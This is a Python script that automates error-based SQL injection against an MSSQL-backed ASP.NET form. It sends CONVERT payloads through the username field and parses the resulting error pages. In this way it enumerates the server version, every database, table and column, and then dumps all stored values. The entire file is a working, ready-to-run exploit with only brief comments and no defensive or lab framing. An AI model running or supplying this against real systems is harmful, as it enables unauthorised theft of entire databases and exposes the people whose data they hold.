#!/usr/bin/python3

# Perform error-based SQL injection for an MSSQL server with 'CONVERT'
# The injection can be triggered with a post request and the error message is parsed to get data

# Will find all databases, then list all tables and columns within each database,
# then list all data within each column

import requests
from bs4 import BeautifulSoup


def post_request(username, email):
        url = "http://1.1.1.1/sql_path/"
        headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"}


        sess = requests.Session()
        sess.headers.update(headers)
        r = sess.get(url)

        soup = BeautifulSoup(r.content, 'html5lib')

        VIEWSTATE=soup.find(id="__VIEWSTATE")['value']
        VIEWSTATEGENERATOR=soup.find(id="__VIEWSTATEGENERATOR")['value']
        EVENTVALIDATION=soup.find(id="__EVENTVALIDATION")['value']


        login_data = {
                "__VIEWSTATE":VIEWSTATE,
                "__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,
                "__EVENTVALIDATION":EVENTVALIDATION,
                "ctl00$MainContent$UsernameBox":username,
                "ctl00$MainContent$emailBox":email,
                "ctl00$MainContent$submit":"Submit"
        }

        r = sess.post(url, data=login_data)
        return r

def parse_response(resp):
        soup = BeautifulSoup(resp.content, 'html5lib')
        error = str(soup.find('title'))
        start_delim = "nvarchar value '"
        end_delim = "' to data type int"
        begin = error.find(start_delim) + len(start_delim)

        end = error[begin:].find(end_delim)
        return error[begin:begin+end]

def perform_injection(injection):
        r = post_request(injection, "a@mail.com")
        out = parse_response(r)
        return out

def get_version():
        injection = "',convert(int,@@version));--"
        out = perform_injection(injection)
        print(out)

def list_databases():
        print("[+] Listing databases...")
        out = 'tmp'
        x = 1
        databases = []
        while out != '':
                injection = f"',convert(int,(select db_name({x}))));--"
                out = perform_injection(injection)
                print(out)
                databases.append(out)
                x += 1
        print("[+] Done listing")
        return databases[:-1]

def list_tables(db):
        tables = []
        print(f"\n[+] Listing tables in {db}")

        # Get first table
        injection = f"',convert(int,(select top 1 table_name from {db}.information_schema.tables)));--"
        out = perform_injection(injection)
        tables.append(out)
        print(out)

        # Check for other tables
        injection = f"""',convert(int,(select top 1 table_name from {db}.information_schema.tables 
                where table_name not in ({out}))));--"""
        out = perform_injection(injection)
        if out != '':
                # There are other tables
                while out != '':
                        tables.append(out)
                        table_list = '(\'' + tables[0] + '\''
                        for x in range(len(tables)):
                                table_list += ', \'' + tables[x] + '\''
                        table_list += ')'
                        injection = f"""',convert(int,(select top 1 table_name from {db}.information_schema.tables 
                                where table_name not in {table_list})));--"""
                        out = perform_injection(injection)
        return tables


def list_columns(db, table):

        print(f"\n[+++] Listing columns in {db}.{table}")
        columns = []

        # Get first column
        injection = f"""',convert(int,(select top 1 column_name from {db}.information_schema.columns 
                where table_name = \'{table}\')));--"""

        out = perform_injection(injection)
        print(out)
        columns.append(out)

        # Get other columns
        column_list = f"'{out}'"
        while out != '':
                for x in range(1, len(columns)):
                        column_list += f", '{columns[x]}'"
                injection = f"""',convert(int,(select top 1 column_name from {db}.information_schema.columns 
                        where table_name = \'{table}\' and column_name not in ({column_list}))));--"""

                out = perform_injection(injection)
                print(out)
                columns.append(out)
        return columns[:-1]

def extract_data(db, table, column):

        print(f"\n[++++] Extracting values from column '{column}' in {db}.{table}")

        values = []

        # Get first value
        injection = f"""',convert(int,(select top 1  {column} from {db}.dbo.{table})));--"""
        out = perform_injection(injection)
        if "when converting" in out:
                out = out.split('\'')[1]
                print("had to split out: " + out)

        print(out)
        values.append(out)

        # Get other columns
        value_list = f"'{out}'"
        while out != '':
                for x in range(1, len(values)):
                        value_list += f", '{values[x]}'"
                injection = f"""',convert(int,(select top 1 {column} from {db}.dbo.{table} 
                        where {column} not in ({value_list}))));--"""

                out = perform_injection(injection)
                if "when converting" in out:
                        out = out.split('\'')[1]
                        print(out)
                values.append(out)
        return values[:-1]



def main():
        dbs = list_databases()

        for db in dbs:
                tables = list_tables(db)
                for table in tables:
                        columns = list_columns(db, table)
                        for column in columns:
                                data = extract_data(db, table, column)
                                print(f"\n[==] Final data for {db}.{table}.{column}:")
                                for x in data:
                                        print(x)



if __name__ == "__main__":
        main()
